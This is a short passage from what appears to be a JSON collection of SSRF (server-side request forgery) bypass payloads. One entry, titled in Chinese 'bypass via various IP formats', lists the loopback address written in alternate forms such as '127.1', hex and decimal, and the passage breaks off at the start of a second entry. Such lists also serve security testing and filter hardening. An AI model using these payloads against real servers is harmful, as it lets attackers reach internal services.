              "id": "ssrf-bypass-01",
              "title": "IP 各种格式绕过",
              "payload": "http://0\nhttp://127.0.0.1\nhttp://127.0.0.0\nhttp://127.1\nhttp://0x7f.0.0.1\nhttp://2130706433"
            },
            {
              "id": "ssrf-bypass-02",
